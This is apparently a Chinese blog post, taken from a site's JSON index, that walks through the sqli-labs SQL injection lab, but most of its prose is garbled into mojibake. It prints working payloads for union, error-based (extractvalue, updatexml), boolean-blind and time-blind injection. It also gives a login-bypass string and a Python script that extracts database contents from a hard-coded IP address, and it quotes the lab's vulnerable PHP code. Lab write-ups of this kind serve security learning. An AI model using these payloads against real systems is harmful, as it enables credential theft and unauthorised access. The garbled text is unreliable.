|+------------------------+| fg |+------------------------+1 row in set (0.01 sec)mysql&gt; select substr(&quot;abcdefg&quot;,-2,1);+------------------------+| substr(&quot;abcdefg&quot;,-2,1) |+------------------------+| f |+------------------------+1 row in set (0.00 sec)mysql&gt; select substr(&quot;abcdefg&quot;,-3,2);+------------------------+| substr(&quot;abcdefg&quot;,-3,2) |+------------------------+| ef |+------------------------+1 row in set (0.00 sec) sleep()éƒ½ä¼šï¼Œä¸è¯´äº† æŠ¥é”™æ³¨å…¥å¸¸ç”¨updatexml()extractvalue()group byæŠ¥é”™æ³¨å…¥0x02 SQLæ³¨å…¥é¶åœºâ€“Sqli-labsLess-1 | æ˜¾é”™æ³¨å…¥åˆ¤æ–­æ³¨å…¥ç‚¹ä¸ºå­—ç¬¦å‹è¿˜æ˜¯æ•°å­—å‹: ?id=1 id=2 id=1+1 è¿™é‡Œå¯ä»¥å‘ç°ï¼Œæ²¡æœ‰å¯¹æˆ‘ä»¬è¾“å…¥çš„1+1è¿›è¡Œè¿ç®—,å¯ä»¥ç¡®å®šæ˜¯å­—ç¬¦å‹æ³¨å…¥ã€‚æŸ¥çœ‹æºä»£ç  1$sql=&quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1&quot;; è¿™é‡Œæœ‰ä¸ªä»¤äººå¼‚æˆ–çš„åœ°æ–¹:?id=1+1ä¸ºå•¥è¿”å›äº†?id=1çš„ç»“æœï¼Œè¿™é‡Œè¿›mysqlæ§åˆ¶å°é‡Œé¢åº·åº·ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061mysql&gt; select * from users where id='1+1';+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set, 1 warning (0.00 sec)mysql&gt; select * from users where id=1;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set (0.00 sec)mysql&gt; select * from users where id=&quot;1&quot;;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set (0.00 sec)mysql&gt; select * from users where id=&quot;1a&quot;;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set, 1 warning (0.00 sec)mysql&gt; select * from users where id=&quot;a1&quot;;Empty set (0.00 sec)mysql&gt; select * from users where id=&quot;0x1&quot;;Empty set (0.00 sec)mysql&gt; select * from users where id=0x1;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set (0.00 sec)mysql&gt; select * from users where id=+0b01;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set (0.00 sec)mysql&gt; select * from users where id=+ 0b01;+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in set (0.00 sec) è¿™å®›å¦‚PHPä¸€æ ·å¼ºå¤§çš„é²æ£’æ€§ï¼Œæˆ‘å·²ç»æœ‰ä¸å¥½çš„é¢„æ„Ÿäº†ã€‚ ä¼—æ‰€å‘¨çŸ¥ï¼Œæ–¹ä¾¿ç¨‹åºå‘˜å†™ä»£ç  = æ–¹ä¾¿é»‘å®¢è¿›æ¥æäº‹æƒ…ã€‚ æ›´æ·±å…¥çš„æµ‹è¯•è”åˆæ³¨å…¥: ?id=1â€™ union select 1,2,3 â€“+ å®é™…æ‰§è¡Œçš„æ˜¯ï¼Œè¿™é‡Œ--+æ˜¯å°†åé¢çš„å†…å®¹æ³¨é‡Šæ‰äº† SELECT * FROM users WHERE id=â€™1â€™ union select 1,2,3 â€“+ LIMIT 0,1 å¥½åƒå•¥éƒ½æ²¡å˜ï¼Œä¸è¿‡åœ¨åç«¯çš„ä»£ç é‡Œå¯ä»¥çœ‹è§ç›¸å…³çš„é€»è¾‘ 12345678if($row) { echo &quot;&lt;font size='5' color= '#99FF00'&gt;&quot;; echo 'Your Login name:'. $row['username']; echo &quot;&lt;br&gt;&quot;; echo 'Your Password:' .$row['password']; echo &quot;&lt;/font&gt;&quot;; } MySQLè¿”å›çš„æ˜¯ 1234567+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb || 1 | 2 | 3 |+----+----------+----------+2 rows in set (0.00 sec) ä½†å› ä¸ºåç«¯ä»£ç çš„è®¾è®¡ï¼Œåªèƒ½æ˜¾ç¤ºç¬¬ä¸€æ¡ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥è®©å‰é¢idæŒ‡å‘ä¸€ä¸ªä¸å­˜åœ¨çš„æ•°æ®,è¿™æ ·ç¬¬ä¸€æ¡æ•°æ®å°±åªä¼šè¿”å›ç©º 1234567mysql&gt; SELECT * FROM users WHERE id='-1' union select 1,2,3; +----+----------+----------+| id | username | password |+----+----------+----------+| 1 | 2 | 3 |+----+----------+----------+1 row in set (0.00 sec) å¼€å§‹çˆ†é‡‘å¸æ•°æ®äº† ?id=-1â€™ union select 1,(select username from users limit 4,1),3 â€“+ å› ä¸ºselect username from usersä¼šè¿”å›å¤šæ¡æ•°æ®ï¼Œè¿™æ—¶å€™ä½¿ç”¨limitæ¥é™åˆ¶è¿”å›å“ªä¸€è¡Œ è¿™æ ·å­çˆ†ç ´æ•°æ®ä¸å¤Ÿçˆ½ï¼Œè¿˜å¾—æ‰‹åŠ¨ä¸€ä¸ªä¸€ä¸ªæ“ï¼Œå¤ªéº»çƒ¦äº†,ç›´æ¥ä¸Šgroup_concat() ?id=-1â€™ union select 1,(select group_concat(username) from users),3 â€“+ ä¸è¿‡è¿™æ˜¯å’±åœ¨ç¿»çœ‹äº†æºä»£ç ï¼Œå¹¶ä¸”çŸ¥é“è¿™äº›æ•°æ®çš„æƒ…å†µä¸‹åšå‡ºæ¥çš„ï¼Œåœ¨çœŸæ­£æ³¨å…¥çš„ç¯å¢ƒä¸‹ï¼Œå¾—éœ€è¦è·å–è¿™äº›æ•°æ®ï¼Œè¿™æ—¶å€™å°±éœ€è¦information_schemaè¿™ä¸ªæ•°æ®åº“äº† ?id=-1â€™ union select 1,(select group_concat(schema_name) from schemata),3 â€“+ å‘ç”Ÿä»€ä¹ˆäº‹äº†ï¼Ÿå¥½åƒæœ‰ç‚¹ä¸å¤ªå¯¹åŠ²å‘¢ã€‚å› ä¸ºè¿™é¢˜æ‰€åœ¨çš„æ•°æ®åº“æ˜¯securityï¼Œè€Œschemataæ˜¯åœ¨information_schemaè¿™ä¸ªæ•°æ®åº“ä¸‹é¢çš„ã€‚æˆ‘ä»¬éœ€è¦æ¢æˆinformation_schema.schemata ?id=-1â€™ union select 1,(select group_concat(schema_name) from information_schema.schemata),3 â€“+ æ•°æ®åº“çˆ†å‡ºæ¥äº†ï¼Œçˆ†è¡¨å ?id=-1â€™ union select 1,(select group_concat(table_name) from information_schema.columns where table_schema=â€securityâ€),3 â€“+ è¡¨åå‡ºæ¥äº†ï¼Œçˆ†å­—æ®µ ?id=-1â€™ union select 1,(select group_concat(column_name) from information_schema.columns where table_name=â€usersâ€),3 â€“+ éœ€è¦çš„æ•°æ®éƒ½æœ‰äº†ï¼Œå’±å¯ä»¥ç›´æ¥æŠŠåº“ç»™è„±ä¸‹æ¥äº† Less-2 - Less-4è¿™å‡ é¢˜éƒ½ä¸€æ ·ï¼Œæ— éæ˜¯æ³¨å…¥ç‚¹å‘¨å›´åŒ…è£¹çš„ä¸œè¥¿ä¸ä¸€æ ·ï¼Œä¸å¤šèµ˜è¿°ï¼Œè¿‡ã€‚ Less-5 | å¸ƒå°”ç›²æ³¨ ?id=1 çœ‰æ¸…ç›®ç§€ï¼Œå•¥éƒ½æœ¨æœ‰ã€‚ ?id=1â€â€˜ä¸€é€šæµ‹è¯•ä¸‹æ¥ï¼Œå‘ç°æœ‰äº†æŠ¥é”™ä¿¡æ¯ å¦‚ä½•åˆ©ç”¨æŠ¥é”™ä¿¡æ¯æ³¨å…¥å‘¢ï¼Ÿ ?id=1â€™ and 1 = 1 â€“+i ?id=2â€™ and 2 = 1 â€“+ é‚£æœ‰æ„æ€çš„å°±æ¥äº†ï¼Œå˜»å˜» 12345678mysql&gt; select ((substr(group_concat((select group_concat(schema_name) from information_schema.schemata)),1,1))=0);+-----------------------------------------------------------------------------------------------------+| ((substr(group_concat((select group_concat(schema_name) from information_schema.schemata)),1,1))=0) |+-----------------------------------------------------------------------------------------------------+| 1 |+-----------------------------------------------------------------------------------------------------+1 row in set (0.00 sec) çˆ†æ•°æ®åº“ 1234567891011121314import requestsurl = &quot;http://39.104.82.167/Less-5/?id=&quot;res = &quot;&quot;for i in range(0,256): for j in range(0,256): for k in range(0,256): payload = f&quot;1' and ascii(substr((select group_concat(schema_name) from information_schema.schemata),{j},1)) = {k} --+&quot; r = requests.get(url+payload) if &quot;You are in...........&quot; in r.text: res += chr(k) print(res) break æ›´æ”¹payloadæ¥çˆ†è¡¨ 1payload = f&quot;1' and ascii(substr((select group_concat(table_name) from information_schema.columns where table_schema=\\&quot;security\\&quot;),{j},1)) = {k} --+&quot; æ›´æ”¹payload æ¥çˆ†å­—æ®µ 1payload = f&quot;1' and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot;),{j},1)) = {k} --+&quot; Tips æ— ANDçš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ç”¨^ Less 6-8 éƒ½å·®ä¸å¤šï¼Œå°±æ˜¯éœ€è¦å„ç§å¥‡å¦™çš„é—­åˆç•¥ Less 9è¿™é‡Œéœ€è¦æ—¶é—´ç›²æ³¨ï¼Œå’Œå¸ƒå°”ç›²æ³¨å·®ä¸å¤šåªæ˜¯éœ€è¦æ·»åŠ ä¸€ä¸ªif(a,sleep(10),1)åˆ¤æ–­ ?id=1â€™ and if(1=1,sleep(5),1)â€“+ åˆ¤æ–­å‚æ•°æ„é€ ã€‚ ?id=1â€™and if(length((select database()))&gt;9,sleep(5),1)â€“+ åˆ¤æ–­æ•°æ®åº“åé•¿åº¦ ?id=1â€™and if(ascii(substr((select database()),1,1))=115,sleep(5),1)â€“+ é€ä¸€åˆ¤æ–­æ•°æ®åº“å­—ç¬¦ ?id=1â€™and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,sleep(5),1)â€“+ åˆ¤æ–­æ‰€æœ‰è¡¨åé•¿åº¦ ?id=1â€™and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)â€“+ é€ä¸€åˆ¤æ–­è¡¨å ?id=1â€™and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=â€™usersâ€™))&gt;20,sleep(5),1)â€“+ åˆ¤æ–­æ‰€æœ‰å­—æ®µåçš„é•¿åº¦ ?id=1â€™and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=â€™usersâ€™),1,1))&gt;99,sleep(5),1)â€“+ é€ä¸€åˆ¤æ–­å­—æ®µåã€‚ ?id=1â€™ and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)â€“+ åˆ¤æ–­å­—æ®µå†…å®¹é•¿åº¦ ?id=1â€™ and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)â€“+ é€ä¸€æ£€æµ‹å†…å®¹ã€‚ Less 10 ä¸€æ¨¡ä¸€æ ·ï¼Œç•¥Less 11 | ä¸‡èƒ½å¯†ç è¿™æ¬¡å¼€å§‹ï¼Œä¸æ˜¯getä¼ å‚äº†ï¼Œæ¢æˆPOSTä¼ å‚è¿˜ç»™äº†ä¸ªç™»å½•æ¡†ï¼Œå…ˆéšä¾¿ç©¿ä¸ªæ•°æ®åº·åº· è¿™æ—¶å€™æ‹¿å‡ºæˆ‘ä»¬çš„ç©¶ææ— æ•Œç‚«é…·ä¸‡èƒ½å¯†ç 1' or 1=1# å¥½äº†ï¼Œè¿™å°±è¿›å»äº† ä¸ºä»€ä¹ˆå‘¢ï¼Ÿå’±æŠŠæºç ç¿»å¼€ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;?php//including the Mysql connect parameters.include(&quot;../sql-connections/sql-connect.php&quot;);error_reporting(0);// take the variablesif(isset($_POST['uname']) &amp;&amp; isset($_POST['passwd'])){ $uname=$_POST['uname']; $passwd=$_POST['passwd']; //logging the connection parameters to a file for analysis. $fp=fopen('result.txt','a'); fwrite($fp,'User Name:'.$uname); fwrite($fp,'Password:'.$passwd.&quot;\\n&quot;); fclose($fp); // connectivity @$sql=&quot;SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1&quot;; $result=mysql_query($sql); //æ³¨æ„è¿™é‡Œ $row = mysql_fetch_array($result); if($row) { //echo '&lt;font color= &quot;#0000ff&quot;&gt;'; echo &quot;&lt;br&gt;&quot;; echo '&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;'; //echo &quot; You Have successfully logged in\\n\\n &quot; ; echo '&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;'; echo &quot;&lt;br&gt;&quot;; echo 'Your Login name:'. $row['username']; echo &quot;&lt;br&gt;&quot;; echo 'Your Password:' .$row['password']; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;br&gt;&quot;; echo '&lt;img src=&quot;../images/flag.jpg&quot; /&gt;'; echo &quot;&lt;/font&gt;&quot;; } else { echo '&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;'; //echo &quot;Try again looser&quot;; print_r(mysql_error()); echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo &quot;&lt;/br&gt;&quot;; echo '&lt;img src=&quot;../images/slap.jpg&quot; /&gt;'; echo &quot;&lt;/font&gt;&quot;; }}?&gt; å…³é”®ç‚¹åœ¨è¿™é‡Œ$result=mysql_query($sql); è¿™é‡Œçš„ç»“æœæ˜¯ç”¨sqlè¯­å¥çš„æŸ¥è¯¢ç»“æœæ¥ï¼Œæ‰€ä»¥åªéœ€è¦è®©è¯­å¥è¿”å›ä¸€ä¸ªçœŸå°±è¡Œäº†ï¼Œor 1 = 1ä½¿å¾—æ•´ä¸ªè¯­å¥æ’çœŸï¼Œè¿™å°±è®©æˆ‘ä»¬æˆåŠŸç™»é™†è¿›å»äº† ä¹‹åæˆ‘ä»¬å°±å¯ä»¥æ³¨å…¥è·å–ä¿¡æ¯äº†ã€‚ Less 12 -16 éƒ½å·®ä¸å¤šç•¥ Less 17 | æŠ¥é”™æ³¨å…¥è¿™é¢˜å¼€å§‹ä¸åŒäº†ï¼Œä½¿ç”¨çš„æ˜¯updateè€Œä¸æ˜¯select 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394function check_input($value) { if(!empty($value)) { // truncation (see comments) $value = substr($value,0,15); } // Stripslashes if magic quotes enabled if (get_magic_quotes_gpc()) { $value = stripslashes($value); } // Quote if not a number if (!ctype_digit($value)) { $value = &quot;'&quot; . mysql_real_escape_string($value) . &quot;'&quot;; } else { $value = intval($value); } return $value; }// take the variablesif(isset($_POST['uname']) &amp;&amp; isset($_POST['passwd'])){//making sure uname is not injectable$uname=check_input($_POST['uname']); $passwd=$_POST['passwd'];//logging the connection parameters to a file for analysis.$fp=fopen('result.txt','a');fwrite($fp,'User Name:'.$uname.&quot;\\n&quot;);fwrite($fp,'New Password:'.$passwd.&quot;\\n&quot;);fclose($fp);// connectivity @$sql=&quot;SELECT username, password FROM users WHERE username= $uname LIMIT 0,1&quot;;$result=mysql_query($sql);$row = mysql_fetch_array($result);//echo $row; if($row) { //echo '&lt;font color= &quot;#0000ff&quot;&gt;'; $row1 = $row['username']; //echo 'Your Login name:'. $row1; $update=&quot;UPDATE users SET password = '$passwd' WHERE username='$row1'&quot;; mysql_query($update); echo &quot;&lt;br&gt;&quot;; if (mysql_error()) { echo '&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;'; print_r(mysql_error()); echo &quot;&lt;/br&gt;&lt;/br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; } else { echo '&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;'; //echo &quot; You password has been successfully updated &quot; ; echo &quot;&lt;br&gt;&quot;; echo &quot;&lt;/font&gt;&quot;; } echo '&lt;img src=&quot;../images/flag1.jpg&quot; /&gt;'; //echo 'Your Password:' .$row['password']; echo &quot;&lt;/font&gt;&quot;; } else { echo '&lt;font size=&quot;4.5&quot; color=&quot;#FFFF00&quot;&gt;'; //echo &quot;Bug off you Silly Dumb hacker&quot;; echo &quot;&lt;/br&gt;&quot;; echo '&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;'; echo &quot;&lt;/font&gt;&quot;; }} æŠ¥é”™æ³¨å…¥å¼€æ·¦ èƒ½è¿›è¡ŒæŠ¥é”™çš„å‡½æ•°extractvalue() æ¼”ç¤º: 12345mysql&gt; select extractvalue(1,concat(0x5c,&quot;114514&quot;,0x5c));ERROR 1105 (HY000): XPATH syntax error: '\\114514\\'``` * payload: 1â€™ and (extractvalue(1,concat(0x5c,version(),0x5c)))# çˆ†ç‰ˆæœ¬ 1â€™ and (extractvalue(1,concat(0x5c,database(),0x5c)))# çˆ†æ•°æ®åº“ 1â€™ and (extractvalue(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c)))# çˆ†è¡¨å 1â€™ and (extractvalue(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=â€™usersâ€™),0x5c)))# çˆ†å­—æ®µå 1â€™ and (extractvalue(1,concat(0x5c,(select password from (select password from users where username=â€™admin1â€™) b) ,0x5c)))# çˆ†å­—æ®µå†…å®¹è¯¥æ ¼å¼é’ˆå¯¹mysqlæ•°æ®åº“ã€‚ 1â€™ and (extractvalue(1,concat(0x5c,(select group_concat(username,password) from users),0x5c)))# çˆ†å­—æ®µå†…å®¹ã€‚ 1234567#### updatexml()* `updatexml()`æ˜¯ä¸€ä¸ªä½¿ç”¨ä¸åŒçš„xmlæ ‡è®°åŒ¹é…å’Œæ›¿æ¢xmlå—çš„å‡½æ•°ã€‚* è¯­æ³•ï¼š updatexmlï¼ˆXML_documentï¼ŒXPath_stringï¼Œnew_valueï¼‰ ç¬¬ä¸€ä¸ªå‚æ•°ï¼šæ˜¯stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ–‡ä¸­ä¸ºDoc ç¬¬äºŒä¸ªå‚æ•°ï¼šä»£è¡¨è·¯å¾„ï¼ŒXpathæ ¼å¼çš„å­—ç¬¦ä¸²ä¾‹å¦‚//titleã€@langã€‘ ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šstringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®* updatexmlä½¿ç”¨æ—¶ï¼Œå½“xpath_stringæ ¼å¼å‡ºç°é”™è¯¯ï¼Œmysqlåˆ™ä¼šçˆ†å‡ºxpathè¯­æ³•é”™è¯¯ï¼ˆxpath syntaxï¼‰ mysql&gt; select (updatexml(1,concat(0x7e,(version()),0x7e),1));ERROR 1105 (HY000): XPATH syntax error: â€˜5.5.44-0ubuntu0.14.04.1â€˜ å…¬å¼: updatexml(æ•°å­—,å¸¦æœ‰'~'çš„ä»»ä½•ä¸œè¥¿,æ•°å­—) updatexml(æ•°å­—,(concat(0x7e,(é•¿åº¦ä¸è¿‡63çš„ä»»æ„å­—ç¬¦),0x7e)),æ•°å­—) ## less 18 - Less19 åœ°ç‚¹ä¸ä¸€æ ·ï¼Œæ‡’å¾—å¼„äº†. ## Less20 - Less23 base64ç¼–ç äº†ä¸€ä¸‹ï¼Œè¿˜æ˜¯ä¸€æ · ## Less24 | äºŒæ¬¡æ³¨å…¥","link":"/2022/10/06/sql/"}],"tags":[{"name":"CTF","slug":"CTF","link":"/tags/CTF/"},{"name":"WEB","slug":"WEB","link":"/tags/WEB/"},{"name":"RCE","slug":"RCE","link":"/tags/RCE/"},{"name":"Hexo","slug":"Hexo","link":"/tags/Hexo/"},{"name":"Troubleshooting","slug":"Troubleshooting","link":"/tags/Troubleshooting/"},{"name":"ETH","slug":"ETH","link":"/tags/ETH/"},{"name":"Solidity","slug":"Solidity","link":"/tags/Solidity/"},{"name":"upload","slug":"upload","link":"/tags/upload/"},{"name":"å¤ç°","slug":"å¤ç°","link":"/tags/%E5%A4%8D%E7%8E%B0/"},{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","link":"/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"phar","slug":"phar","link":"/tags/phar/"},{"name":"Blockchain","slug":"Blockchain","link":"/tags/Blockchain/"},{"name":"SQL","slug":"SQL","link":"/tags/SQL/"},{"name":"web","slug":"web","link":"/tags/web/"},{"name":"inject","slug":"inject","link":"/tags/inject/"}],"categories":[{"name":"SQL","slug":"SQL","link":"/categories/SQL/"}]}